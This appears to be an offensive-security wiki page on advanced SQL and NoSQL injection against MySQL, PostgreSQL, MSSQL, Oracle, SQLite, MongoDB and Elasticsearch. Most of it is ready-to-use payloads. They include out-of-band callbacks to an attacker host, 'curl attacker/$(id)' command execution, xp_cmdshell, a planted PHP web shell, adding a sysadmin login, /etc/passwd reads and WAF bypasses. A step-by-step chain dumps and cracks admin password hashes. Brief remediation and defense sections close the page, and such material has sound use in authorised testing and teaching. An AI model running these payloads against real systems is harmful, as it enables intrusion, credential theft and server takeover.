---
type: wiki
category: attack
tool: sqlmap,ghauri,manual
status: active
last-updated: 2026-04-21
---

# SQLi Deep-Dive Attacks (2026 Edition)

> **Purpose:** [29-tool-sqlmap.md](29-tool-sqlmap.md) covers sqlmap usage; this doc adds depth: 2nd-order, OOB, NoSQLi (Mongo/Redis/Elastic/GraphQL), stacked queries, time-based blind tuning, and DB-specific tricks.

## 0. Why This Doc Exists

```
Situations sqlmap --level=5 --risk=3 can't crack:
1. Parameter reaches a 2nd-order sink (triggered post-login)
2. Blind + heavy timing jitter (CDN + queue) → sqlmap time-based false positives
3. NoSQLi (not SQL syntax, sqlmap doesn't recognize it)
4. GraphQL variable injection
5. WAF blocks sqlmap's fingerprint (X-SQLMap / UA)
6. Stacked queries blocked by ORM but still possible inline
```

This doc helps you handle these scenarios.

## 1. 2nd-Order SQLi (Very Hard for Scanners to Find)

### 1.1 Principle

User input A is escaped and stored in the DB. A later action B pulls that row out of the DB and concatenates it into SQL again — the originally-escaped `'` becomes an injectable character.

```sql
-- Step 1: register
INSERT INTO users (name) VALUES ("admin'--")     -- stored after escaping

-- Step 2: later action
SELECT * FROM logs WHERE user = 'admin'--'       -- not escaped → injected
```

### 1.2 Testing Flow

```bash
# 1. Enter an SQLi payload in the profile
# 2. Trigger an endpoint that uses this profile (password change / order / search my items / export)
# 3. Look for error / timing / content differences

# Common 2nd-order sinks:
- /profile/export
- /orders/my
- /settings/notify
- /admin/users/search (if an admin looks you up)
- /api/logs/me
```

### 1.3 sqlmap 2nd-order

```bash
sqlmap -r request.txt \
  --second-order 'https://target.com/profile/export' \
  --level=5 --risk=3
```

sqlmap injects into `request.txt`, then hits the `--second-order` URL and inspects that response.

## 2. Out-of-Band (OOB) SQLi

### 2.1 Principle

The DB actively fires a DNS / HTTP callback — bypassing the slowness of blind techniques and WAFs that don't see the payload in the response.

### 2.2 MSSQL xp_dirtree / xp_fileexist

```sql
'; DECLARE @q varchar(99); SET @q='\\abc123.oast.live\x'; EXEC master..xp_dirtree @q;--
```

### 2.3 Oracle UTL_HTTP

```sql
' || UTL_HTTP.REQUEST('http://abc123.oast.live/'||user) || '
```

### 2.4 MySQL (Requires FILE Privilege + secure_file_priv Unset)

```sql
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.oast.live\\x')) -- 
# Triggers SMB lookup on Windows
```

### 2.5 PostgreSQL

```sql
'; COPY (SELECT '') TO PROGRAM 'curl http://abc123.oast.live/?d='||current_user; --
# Requires superuser
```

### 2.6 sqlmap OOB Mode

```bash
sqlmap -r request.txt --dns-domain=abc123.oast.live --technique=B
# DNS channel (requires controlling a DNS server / using interactsh)
```

## 3. Blind Timing Calibration

### 3.1 The Timing Jitter Problem

Cloud environment + CDN + DB queue → response time is unstable, causing sqlmap misjudgments.

### 3.2 Manual Calibration

```bash
# Baseline
for i in {1..10}; do
  curl -s -w '%{time_total}\n' -o /dev/null \
    "https://target.com/search?q=normal"
done
# Average 200ms, stddev 50ms

# Inject 7 seconds
for i in {1..10}; do
  curl -s -w '%{time_total}\n' -o /dev/null \
    "https://target.com/search?q=';SELECT+pg_sleep(7)--"
done
# Should be >= 7s + baseline; if consistently ~7.2s → time-based is viable

# sqlmap tuning
sqlmap -u "..." --technique=T --time-sec=10 --threads=1
```

### 3.3 Heavy Queries Instead of Sleep

If sleep is blocked by a WAF, or the DB can't execute it (stored proc restrictions):

```sql
-- MySQL
IF(ASCII(SUBSTR(user(),1,1))=114, BENCHMARK(5000000,MD5('x')), 0)

-- PostgreSQL
CASE WHEN (SELECT count(*) FROM pg_stats)>0 THEN (SELECT pg_sleep(5)) ELSE null END

-- MSSQL
IF (ASCII(SUBSTRING((SELECT @@version),1,1))=77)
  BEGIN SELECT COUNT(*) FROM sys.objects AS a, sys.objects AS b, sys.objects AS c END
```

## 4. Stacked Queries

### 4.1 Support by DB

| DB | Stacked Support? |
|----|-----------------|
| MSSQL | ✅ Most drivers |
| PostgreSQL | ✅ |
| MySQL | ❌ Most drivers (mysqli defaults off) |
| Oracle | ❌ |
| SQLite | ✅ |

### 4.2 Uses

```sql
-- Modify data (MSSQL / PostgreSQL)
'; UPDATE users SET role='admin' WHERE name='me'--

-- Add a DB user (MSSQL)
'; EXEC sp_addlogin 'attacker','P@ss'; EXEC sp_addsrvrolemember 'attacker','sysadmin'--

-- RCE (MSSQL xp_cmdshell)
'; EXEC xp_cmdshell 'whoami'--

-- RCE (PostgreSQL COPY TO PROGRAM)
'; COPY cmd TO PROGRAM 'curl attacker/$(id)'--
```

### 4.3 Bypassing ORMs/Drivers That Don't Support Stacked Queries

When `;` doesn't work, try **inline** techniques:

```sql
-- MSSQL
id=1 AND 1=(SELECT 1 WHERE 1=(SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END))
-- Subquery executes arbitrary DML (on some versions)
```

## 5. DB-Specific Attacks

### 5.1 MySQL

```sql
-- Version leak
SELECT version();  → 5.7.x / 8.0.x

-- Read a file
SELECT LOAD_FILE('/etc/passwd');   -- requires FILE privilege
-- Write a file
' UNION SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/s.php'-- 
-- Requires secure_file_priv unset + knowing the web root + write access

-- information_schema enum
UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()

-- MySQL 8 has a sys.* schema:
UNION SELECT * FROM sys.user_summary
```

### 5.2 PostgreSQL

```sql
-- Version
SELECT version();

-- Read a file (requires superuser)
SELECT pg_read_file('/etc/passwd');
CREATE TABLE tmp(data text);
COPY tmp FROM '/etc/passwd';

-- RCE (requires superuser)
COPY cmd_output FROM PROGRAM 'curl attacker/$(id)';
-- Or CVE-2019-9193 stored proc

-- Enum
SELECT datname FROM pg_database;
SELECT schema_name FROM information_schema.schemata;
```

### 5.3 MSSQL

```sql
-- Version
SELECT @@version;

-- xp_cmdshell (requires enabling)
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- Read a file
EXEC xp_fileexist 'C:\Windows\win.ini';
BULK INSERT tmp FROM 'C:\Windows\win.ini';

-- Linked server hop (internal network pivot)
EXEC ('EXEC xp_cmdshell ''whoami''') AT [LINKED_SERVER];
```

### 5.4 Oracle

```sql
-- Version
SELECT banner FROM v$version;

-- Read a file (requires CREATE PROCEDURE + UTL_FILE privilege)
-- Usually done via UTL_HTTP OOB instead

-- Enum
SELECT table_name FROM all_tables;
SELECT column_name FROM all_tab_columns WHERE table_name='USERS';
```

### 5.5 SQLite

```sql
-- Version
SELECT sqlite_version();

-- Enum
SELECT name FROM sqlite_master WHERE type='table';
SELECT sql FROM sqlite_master WHERE name='users';

-- Use UNION when stacked queries aren't available

-- Load extension (RCE) - requires trusted schema
SELECT load_extension('/path/to/ext.so');
```

## 6. NoSQL Injection

### 6.1 MongoDB

**Operator injection** (JSON body):

```json
// Normal
{"user":"alice","pass":"pw"}

// Attack
{"user":"admin","pass":{"$ne":null}}   // any non-null pass passes
{"user":"admin","pass":{"$regex":"^a"}}  // brute-force the password prefix
{"user":{"$ne":null},"pass":{"$ne":null}}  // logs in as the first user
```

**String context** (`$where`):

```javascript
// If the server uses
db.users.find({$where: "this.name=='" + input + "'"})

// Attack
name=';return true;var x='
// → $where: "this.name=='';return true;var x==''"
// returns everything
```

### 6.2 sqlmap Doesn't Support This → Use NoSQLMap

```bash
git clone https://github.com/codingo/NoSQLMap
cd NoSQLMap
python nosqlmap.py
# Interactive menu
```

### 6.3 Redis (via SSRF)

See [66-ssrf-deep.md](66-ssrf-deep.md) for gopher-based Redis RCE.

### 6.4 Elasticsearch

```
POST /users/_search
{
  "query": {
    "match": {
      "name": {"query":"alice\" OR 1=1 // ","lenient":true}
    }
  }
}
```

CVE-2014-3120: older ES versions allow script execution:

```
{"script_fields": {"cmd": {"script": "java.lang.Runtime.getRuntime().exec('id')"}}}
```

### 6.5 GraphQL Variable Injection

```graphql
query($id: ID!) {
  user(id: $id) { name }
}

# Normal variables
{"id": "5"}

# Injection (if the resolver concatenates strings)
{"id": "5' OR '1'='1"}
```

See [17-graphql-deep-attacks.md](17-graphql-deep-attacks.md) for details.

## 7. WAF Bypass Techniques

### 7.1 Keyword Bypass

```sql
-- SELECT blocked
SeLeCt
SE%00LECT
SEL/**/ECT
SEL/*!SELECT*/ECT          -- MySQL comment
SE+LECT                    -- some parsers

-- UNION blocked
UN/**/ION
UNION%0a
/*!50000UNION*/
```

### 7.2 Space Bypass

```sql
UNION(SELECT(1))FROM(users)
UNION/**/SELECT
UNION%09SELECT
UNION%0aSELECT
UNION(SELECT/**/1)
```

### 7.3 Quote Bypass

```sql
-- Single quote blocked
CHAR(97,100,109,105,110)    -- 'admin' in MySQL
0x61646d696e                -- hex
UNHEX('61646d696e')
```

### 7.4 Encoding Bypass

```
# URL encoding
%27 → '
%2527 → %27 → ' (double encode)

# Unicode
%E2%80%98 → ' (left single quote, some parsers normalize this to ')
```

### 7.5 HPP + WAF Bypass

See [69-mass-assignment-hpp.md](69-mass-assignment-hpp.md).

### 7.6 Tamper Scripts (sqlmap)

```bash
sqlmap -u "..." --tamper=space2comment,between,randomcase,charunicodeencode
# List all
sqlmap --list-tampers
```

## 8. Tools

### 8.1 sqlmap

See [29-tool-sqlmap.md](29-tool-sqlmap.md).

### 8.2 Ghauri (sqlmap Alternative)

```bash
pip install ghauri
ghauri -u "https://target.com/?id=1" --level=3 --dbs
# Faster than sqlmap, better at WAF bypass
```

### 8.3 NoSQLMap

```bash
git clone https://github.com/codingo/NoSQLMap
```

### 8.4 jSQL Injection (GUI)

```bash
java -jar jsql-injection.jar
```

### 8.5 Burp SQL Injection Profile (Built into Pro)

Scanner → audit checks → SQL injection.

## 9. Full PoC: MySQL Time-Based Blind → Admin Password Hash

### Step 1: Confirm the Injection Point

```bash
curl "https://target.com/search?q=x' AND SLEEP(5)-- -"
# 5 seconds → injection exists

curl "https://target.com/search?q=x' AND SLEEP(5)-- -" -w '%{time_total}'
# 5.2 seconds
```

### Step 2: Manually Confirm the DB Version (Confirm Blind Is Usable)

```bash
for ver in 5 8; do
  T=$(curl -s -o /dev/null -w '%{time_total}' \
    "https://target.com/search?q=x'%20AND%20IF(SUBSTRING(VERSION(),1,1)=$ver,SLEEP(5),0)--%20-")
  echo "ver=$ver time=$T"
done
# ver=8 time=5.1 → MySQL 8.x
```

### Step 3: Fine-Tune sqlmap

```bash
sqlmap -u "https://target.com/search?q=*" \
  --technique=T --time-sec=5 --level=5 --risk=3 \
  --tamper=space2comment,randomcase \
  --threads=1 \
  --dbs
```

### Step 4: Dump the Admin Hash

```bash
sqlmap -u "..." -D app_db -T users -C password_hash,email --where "role='admin'" --dump
```

### Step 5: Offline Crack

```bash
hashcat -m 0 hash.txt rockyou.txt
# or john
```

### Step 6: Report

```markdown
## Vulnerability Overview
https://target.com/search?q= does not parameterize the SQL query, allowing
time-based blind SQLi. An attacker can extract the admin password hash and
crack it offline to obtain admin credentials.

## PoC
[3 curl commands: sleep confirmation + version detection + hash dump]

## Impact
- Arbitrary DB data leakage (all user emails/phones/hashes)
- Combined with password hash → admin ATO
- If FILE_PRIV is enabled → read /etc/passwd + write a webshell → RCE

## Severity
P1 / Critical

## Remediation
1. Prepared statements / parameterized queries (at every DB layer)
2. Use the ORM's safe APIs (Sequelize `where: {q}`, Django `filter(q=q)`)
3. WAF as a supplementary defense only, not the primary one
4. Least-privilege DB user (disable FILE/superuser for the application DB user)
```

## 10. Defense Checklist

```
1. Enforce prepared statements (driver level)
2. Stored procedures must also use parameterized queries
3. Validate ORM usage: no rawQuery(user_input)
4. Input validation (type + length + regex), but never rely on it alone
5. Least-privilege DB user (no FILE, no xp_cmdshell, no pg_read_file)
6. Don't leak error messages (disable stack traces in production)
7. WAF: ModSecurity + OWASP CRS (layer 2 defense)
8. Monitoring: alert on unusual query patterns / slow queries
9. NoSQL: validate input type (reject objects where a string is expected)
10. Time-based defense: request timeouts / rate limiting
```

## Related Documents

- [29-tool-sqlmap.md](29-tool-sqlmap.md) — Complete sqlmap operation guide
- [17-graphql-deep-attacks.md](17-graphql-deep-attacks.md) — GraphQL variable injection
- [66-ssrf-deep.md](66-ssrf-deep.md) — SSRF → Redis / internal DB
- [69-mass-assignment-hpp.md](69-mass-assignment-hpp.md) — HPP + SQLi WAF bypass
- PortSwigger SQLi: https://portswigger.net/web-security/sql-injection
- PayloadsAllTheThings SQLi: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
- Ghauri: https://github.com/r0oth3x49/ghauri
